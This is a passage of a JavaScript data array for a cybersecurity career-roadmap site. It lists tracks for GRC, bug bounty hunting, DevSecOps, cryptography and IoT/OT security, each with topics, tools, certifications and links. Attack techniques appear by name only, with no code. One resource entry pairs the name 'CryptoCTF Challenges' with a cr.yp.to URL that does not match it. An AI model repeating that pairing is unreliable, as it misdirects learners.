        ]
      }
    ]
  },

  // ── 8. GRC & Compliance ──
  {
    id: "grc",
    title: "GRC & Compliance",
    icon: "fa-scale-balanced",
    color: "#14b8a6",
    difficulty: "Beginner → Intermediate",
    description: "Governance, Risk, and Compliance professionals ensure organizations meet regulatory requirements and manage security risks through frameworks, policies, and audits.",
    prerequisites: ["Security fundamentals", "Business processes understanding", "Written communication skills", "Basic IT knowledge"],
    certifications: ["CISA (ISACA)", "CRISC (ISACA)", "CISM (ISACA)", "CompTIA Security+", "ISO 27001 Lead Auditor"],
    phases: [
      {
        name: "Phase 1: Security Frameworks",
        topics: ["NIST Cybersecurity Framework (CSF)", "ISO 27001/27002", "CIS Controls", "SOC 2 Trust Service Criteria", "PCI DSS requirements", "COBIT framework"],
        tools: ["GRC platforms (ServiceNow, Archer)", "Compliance scanning tools", "Policy management systems"],
        resources: [
          { name: "NIST CSF Official", url: "https://www.nist.gov/cyberframework", free: true },
          { name: "ISO 27001 Overview", url: "https://www.iso.org/isoiec-27001-information-security.html", free: true },
          { name: "CIS Controls v8", url: "https://www.cisecurity.org/controls/v8", free: true }
        ]
      },
      {
        name: "Phase 2: Risk Management",
        topics: ["Risk assessment methodologies", "Qualitative vs quantitative risk analysis", "Risk treatment strategies", "Business impact analysis (BIA)", "Third-party risk management", "Risk register and heat maps"],
        tools: ["FAIR model", "NIST RMF", "Risk matrices", "OneTrust", "BitSight"],
        resources: [
          { name: "NIST SP 800-30 Risk Assessment Guide", url: "https://csrc.nist.gov/publications/detail/sp/800-30/rev-1/final", free: true },
          { name: "ISACA — Risk Management Resources", url: "https://www.isaca.org/resources", free: true },
          { name: "Simply Cyber YouTube — GRC Career", url: "https://www.youtube.com/c/GeraldAuger", free: true }
        ]
      },
      {
        name: "Phase 3: Compliance & Privacy",
        topics: ["GDPR compliance requirements", "HIPAA security requirements", "SOC 2 audit preparation", "Security policy development", "Audit planning and evidence collection", "Data privacy impact assessments"],
        tools: ["Vanta", "Drata", "Tugboat Logic", "OneTrust Privacy"],
        resources: [
          { name: "GDPR Official Text", url: "https://gdpr-info.eu/", free: true },
          { name: "HIPAA Training Resources", url: "https://www.hhs.gov/hipaa/for-professionals/training/index.html", free: true }
        ]
      }
    ]
  },

  // ── 9. Bug Bounty Hunter ──
  {
    id: "bug-bounty",
    title: "Bug Bounty Hunter",
    icon: "fa-flag",
    color: "#eab308",
    difficulty: "Intermediate → Advanced",
    description: "Find and report security vulnerabilities in production systems for rewards. Master recon methodology, common bug classes, and professional report writing.",
    prerequisites: ["Web technologies (HTTP, JS, HTML)", "OWASP Top 10 knowledge", "Burp Suite basics", "Persistence and patience"],
    certifications: ["OSCP", "eWPT (INE)", "BSCP (PortSwigger)", "CBBH (HackTheBox)"],
    phases: [
      {
        name: "Phase 1: Recon Methodology",
        topics: ["Subdomain enumeration at scale", "Port scanning and service discovery", "JavaScript analysis for endpoints", "Content discovery and directory bruteforcing", "Parameter mining and hidden functionality", "Technology fingerprinting"],
        tools: ["Subfinder", "httpx", "Nuclei", "Waybackurls", "gau", "ParamSpider", "Arjun"],
        resources: [
          { name: "Nahamsec — Bug Bounty Recon", url: "https://www.youtube.com/c/Nahamsec", free: true },
          { name: "Jason Haddix — Bug Hunter Methodology", url: "https://www.youtube.com/watch?v=uKWu6yhnhbQ", free: true },
          { name: "Bug Bounty Bootcamp (Book)", url: "https://nostarch.com/bug-bounty-bootcamp", free: false },
          { name: "HackerOne Hacktivity — Public Reports", url: "https://hackerone.com/hacktivity", free: true }
        ]
      },
      {
        name: "Phase 2: Common Bug Classes",
        topics: ["XSS (Reflected, Stored, DOM)", "SQL Injection", "SSRF and blind SSRF", "IDOR and broken access control", "Authentication bypasses", "Race conditions", "Business logic flaws", "Open redirects and header injection"],
        tools: ["Burp Suite", "SQLMap", "XSStrike", "SSRFmap", "Autorize"],
        resources: [
          { name: "PortSwigger Web Security Academy", url: "https://portswigger.net/web-security", free: true },
          { name: "PentesterLand — Bug Bounty Writeups", url: "https://pentester.land/list-of-bug-bounty-writeups.html", free: true },
          { name: "STÖK YouTube — Bug Bounty Tips", url: "https://www.youtube.com/c/STOKfredrik", free: true }
        ]
      },
      {
        name: "Phase 3: Reporting & Platforms",
        topics: ["Writing high-quality vulnerability reports", "CVSS scoring and severity assessment", "Impact demonstration and PoC creation", "Platform communication best practices", "Building a public portfolio", "Responsible disclosure ethics"],
        tools: ["HackerOne", "Bugcrowd", "Intigriti", "YesWeHack"],
        resources: [
          { name: "HackerOne — Getting Started", url: "https://docs.hackerone.com/hackers/", free: true },
          { name: "Bugcrowd University", url: "https://www.bugcrowd.com/hackers/bugcrowd-university/", free: true },
          { name: "InsiderPhD — Bug Bounty for Beginners", url: "https://www.youtube.com/c/InsiderPhD", free: true }
        ]
      }
    ]
  },

  // ── 10. DevSecOps ──
  {
    id: "devsecops",
    title: "DevSecOps",
    icon: "fa-gears",
    color: "#22c55e",
    difficulty: "Intermediate → Advanced",
    description: "Integrate security into every stage of the software development lifecycle. Build secure CI/CD pipelines and automate security testing at scale.",
    prerequisites: ["Software development experience", "CI/CD pipeline knowledge", "Git version control", "Docker and containerization", "Cloud basics"],
    certifications: ["CDP (Practical DevSecOps)", "AWS DevOps Professional", "CKS (Kubernetes Security)", "GCSA (SANS)"],
    phases: [
      {
        name: "Phase 1: Secure SDLC & Pipeline Security",
        topics: ["Shift-left security philosophy", "Secure CI/CD pipeline design", "Secret management and rotation", "Dependency scanning (SCA)", "Pre-commit hooks for security", "Branch protection and code review"],
        tools: ["GitHub Actions", "GitLab CI/CD", "Jenkins", "Vault (HashiCorp)", "git-secrets", "Dependabot"],
        resources: [
          { name: "OWASP DevSecOps Guideline", url: "https://owasp.org/www-project-devsecops-guideline/", free: true },
          { name: "Practical DevSecOps", url: "https://www.practical-devsecops.com/", free: false },
          { name: "GitGuardian Blog — Secrets in Code", url: "https://blog.gitguardian.com/", free: true }
        ]
      },
      {
        name: "Phase 2: Automated Security Testing",
        topics: ["SAST integration in CI (CodeQL, Semgrep)", "DAST in staging environments", "Container image scanning", "Infrastructure as Code scanning", "API security testing automation", "Security test result aggregation"],
        tools: ["Semgrep", "Trivy", "Checkov", "tfsec", "OWASP ZAP (automated)", "Snyk"],
        resources: [
          { name: "Semgrep — Write Custom Rules", url: "https://semgrep.dev/docs/", free: true },
          { name: "Trivy Documentation", url: "https://aquasecurity.github.io/trivy/", free: true },
          { name: "Checkov — IaC Scanner", url: "https://www.checkov.io/", free: true }
        ]
      },
      {
        name: "Phase 3: Runtime Security & Monitoring",
        topics: ["Runtime Application Self-Protection (RASP)", "Container runtime security", "Security observability and alerting", "Chaos engineering for security", "Incident response automation", "Compliance as Code"],
        tools: ["Falco", "Datadog Security", "PagerDuty", "Open Policy Agent (OPA)", "Chef InSpec"],
        resources: [
          { name: "Falco — Runtime Security", url: "https://falco.org/docs/", free: true },
          { name: "Open Policy Agent Playground", url: "https://play.openpolicyagent.org/", free: true }
        ]
      }
    ]
  },

  // ── 11. Cryptography & PKI ──
  {
    id: "cryptography",
    title: "Cryptography & PKI",
    icon: "fa-lock",
    color: "#a855f7",
    difficulty: "Intermediate → Advanced",
    description: "Understand the mathematical foundations and practical applications of cryptography. Master encryption, PKI, TLS/SSL, and common cryptographic attacks.",
    prerequisites: ["Mathematics (modular arithmetic)", "Programming basics", "Networking fundamentals", "Security concepts"],
    certifications: ["CompTIA Security+", "CISSP (Cryptography Domain)", "CC (ISC²)"],
    phases: [
      {
        name: "Phase 1: Cryptographic Fundamentals",
        topics: ["Symmetric encryption (AES, ChaCha20)", "Asymmetric encryption (RSA, ECC)", "Hash functions (SHA-256, SHA-3, BLAKE3)", "Message Authentication Codes (HMAC)", "Key Derivation Functions (PBKDF2, Argon2)", "Random number generation (CSPRNG)"],
        tools: ["OpenSSL", "GPG/PGP", "CyberChef", "hashcat"],
        resources: [
          { name: "Cryptopals Crypto Challenges", url: "https://cryptopals.com/", free: true },
          { name: "Khan Academy — Cryptography", url: "https://www.khanacademy.org/computing/computer-science/cryptography", free: true },
          { name: "Crypto101 (Free Book)", url: "https://www.crypto101.io/", free: true }
        ]
      },
      {
        name: "Phase 2: PKI & TLS/SSL",
        topics: ["Public Key Infrastructure architecture", "Certificate Authorities and trust chains", "X.509 certificates and CSRs", "TLS 1.3 handshake deep dive", "Certificate pinning", "OCSP and CRL revocation"],
        tools: ["OpenSSL", "Let's Encrypt / Certbot", "mkcert", "testssl.sh", "SSLyze"],
        resources: [
          { name: "Let's Encrypt Documentation", url: "https://letsencrypt.org/docs/", free: true },
          { name: "Cloudflare — TLS/SSL Guide", url: "https://www.cloudflare.com/learning/ssl/", free: true },
          { name: "testssl.sh — Server SSL Testing", url: "https://testssl.sh/", free: true }
        ]
      },
      {
        name: "Phase 3: Cryptographic Attacks",
        topics: ["Padding oracle attacks", "Bleichenbacher's attack on RSA", "Birthday attacks and collisions", "Side-channel attacks overview", "Downgrade attacks (POODLE, FREAK)", "Post-quantum cryptography awareness"],
        tools: ["PadBuster", "RsaCtfTool", "CyberChef", "SageMath"],
        resources: [
          { name: "CryptoCTF Challenges", url: "https://cr.yp.to/", free: true },
          { name: "Trail of Bits — Crypto Right Answers", url: "https://github.com/trailofbits/publications", free: true }
        ]
      }
    ]
  },

  // ── 12. IoT & OT Security ──
  {
    id: "iot-ot",
    title: "IoT & OT Security",
    icon: "fa-microchip",
    color: "#64748b",
    difficulty: "Intermediate → Advanced",
    description: "Secure Internet of Things devices and Operational Technology systems. Analyze firmware, protocol security, and industrial control systems (ICS/SCADA).",
    prerequisites: ["Networking fundamentals", "Linux basics", "Electronics/hardware awareness", "Embedded systems concepts"],
    certifications: ["GICSP (SANS)", "ICS/SCADA Security (EC-Council)", "IoT Security Foundation certifications"],
    phases: [
      {
        name: "Phase 1: IoT Fundamentals & Attack Surface",
        topics: ["IoT architecture and protocols (MQTT, CoAP, Zigbee)", "Common IoT vulnerabilities", "Default credentials and hardcoded keys", "Insecure update mechanisms", "Bluetooth Low Energy (BLE) security", "IoT network segmentation"],
        tools: ["Shodan", "Censys", "Nmap IoT scripts", "MQTT Explorer", "Wireshark"],
        resources: [
          { name: "OWASP IoT Top 10", url: "https://owasp.org/www-project-internet-of-things-top-10/", free: true },
          { name: "IoT Hacker's Handbook (Book)", url: "https://www.apress.com/", free: false },
          { name: "Attify — IoT Security Blog", url: "https://www.attify.com/blog/", free: true }
        ]
      },
      {
        name: "Phase 2: Firmware Analysis",
        topics: ["Firmware extraction methods (SPI, UART, JTAG)", "Firmware unpacking and filesystem analysis", "Binary analysis of embedded applications", "Hardcoded credential discovery", "Encryption key extraction", "Emulating firmware for dynamic testing"],
        tools: ["Binwalk", "Firmware Analysis Toolkit", "EMBA", "Ghidra", "QEMU", "JTAGulator"],
        resources: [
          { name: "Firmware.re — Firmware Repository", url: "https://firmware.re/", free: true },
          { name: "EMBA Firmware Analyzer", url: "https://github.com/e-m-b-a/emba", free: true },
          { name: "Azeria Labs — ARM Exploitation", url: "https://azeria-labs.com/writing-arm-assembly-part-1/", free: true }
        ]
      },
      {
        name: "Phase 3: ICS/SCADA Security",
        topics: ["ICS/SCADA architecture (PLCs, RTUs, HMIs)", "Modbus, DNP3, OPC-UA protocols", "Industrial network segmentation (Purdue Model)", "NIST SP 800-82 (ICS security guide)", "Safety vs security in OT environments", "ICS-specific threat intelligence"],
        tools: ["GRFICSv2", "SCADAsim", "Wireshark (Modbus dissector)", "OpenPLC"],
        resources: [
          { name: "NIST SP 800-82 (ICS Security)", url: "https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final", free: true },
          { name: "SANS ICS Resources", url: "https://www.sans.org/industrial-control-systems-security/", free: true },
          { name: "GRFICSv2 — Virtual ICS Lab", url: "https://github.com/Fortiphyd/GRFICSv2", free: true }
        ]
      }
    ]
  }
];
